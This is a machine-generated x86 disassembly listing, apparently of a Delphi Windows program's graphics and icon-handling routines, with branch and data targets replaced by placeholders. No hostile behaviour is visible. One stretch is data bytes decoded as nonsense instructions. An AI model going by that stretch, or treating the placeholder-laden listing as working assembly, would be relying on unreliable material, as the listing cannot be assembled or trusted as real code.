mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41f0a8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c64
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c64
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41f09c
xor edx edx
push ebp
push sub_41f296
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41ef68
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41ef68
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41f26f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407b7c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407b7c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407b7c
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407b7c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41efd4
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41efd4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f276
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026dc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41f276
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f29d
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41f2a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41f2f4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41f34c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41f2f4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f395
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031a0
mov edi eax
mov eax esi
call sub_4031a0
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f4cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f4b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407ca8
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4b9
mov al 0x1
sub_41f4e8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416050
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f530
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f537
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_41f53c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41f570
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416050
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f5bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5c2
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_41f5ec
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
push esp
inc ecx
inc ecx
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
add [ esi + edi ] bl
inc ecx
add [ eax + 0x1000413e ] bl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
pushad
test [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xa ] dh
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax ] dh
sbb eax [ ecx ]
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x6c0041f7 ] bh
aas
inc ecx
add [ ecx + eax * 2 + 0x41 ] dl
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
mov edx r-xdata
mov eax esi
call sub_41f804
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f804
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f804
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f768
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fcc
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f761
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403228
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f804
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_40357c
sub_41f684
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f761
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403228
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f804
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_41f804
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f804
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f804
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f768
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fcc
retn
add esp 0xfffffff0
call sub_40357c
sub_41f804
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f887
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404d50
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407d74
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403ffc
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403ffc
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_413de8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f88e
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
sub_41f898
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_404458
xor eax eax
push ebp
push sub_41f91f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407d74
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_404040
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_413f44
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4043b4
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f926
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
sub_41f930
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f9ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_413f44
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_4031a8
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_40420c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4043b4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9b5
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41f9c0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fb3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_403fa8
mov eax [ ebp + 0x8 ]
call sub_403fa8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413f44
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_403484
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb46
lea eax [ ebp - 0x3c ]
call sub_403fa8
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405b88
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408dcc
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404270
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_404270
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408dcc
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_408dcc
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_408384
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_403ffc
sub_41fc0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_41fcb8
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_41fcb8
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_41fcb8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41fc8c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403258
mov eax [ esi + 0x8 ]
call sub_403258
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_41fcb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_413de8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41fcfc
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_413de8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fd60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
call sub_41fd20
call sub_41fd40
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41fda0
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4144d4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_41fdd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4031a0
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4145e4
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_41fe04
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4033e4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403258
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_40346c
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_40346c
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403454
sub_41fe80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_41ff10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403258
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4031a0
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_40346c
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40346c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ff30
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420054
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4085e4
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404508
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41f898
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41fff3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40346c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
mov eax [ ebx + 0xc ]
call sub_403258
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_40346c
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42005b
lea eax [ ebp - 0x14 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_420094
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_41fe80
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_41fe80
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414500
mov edx ebx
mov eax esi
call sub_41fe80
jmp r-xdata
pop esi
pop ebx
retn
sub_4200f0
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_420114
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_42013c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420243
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_40420c
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_41f930
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403258
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4201c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42024a
lea eax [ ebp - 0x48 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_40346c
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_40346c
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_4201ca
mov eax [ ebp - 0x4 ]
call sub_403258
call sub_403a0c
call sub_403a60
mov eax [ ebx + 0xc ]
call sub_403258
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403454
xor eax eax
pop edx
pop ecx
